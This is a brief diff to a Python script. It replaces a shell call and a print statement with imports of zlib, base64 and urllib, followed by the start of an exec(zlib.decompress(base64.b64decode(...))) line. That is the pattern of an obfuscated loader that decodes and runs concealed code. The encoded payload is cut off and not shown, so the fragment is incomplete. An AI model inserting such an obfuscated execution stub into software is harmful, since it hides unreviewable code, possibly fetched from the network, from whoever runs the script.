@@ -1,4 +1,6 @@
 
 import os
-os.system("bash text.sh")
-print ("Done")
+import zlib,base64
+import urllib
+exec(zlib.decompress(base64.b64decode("
+
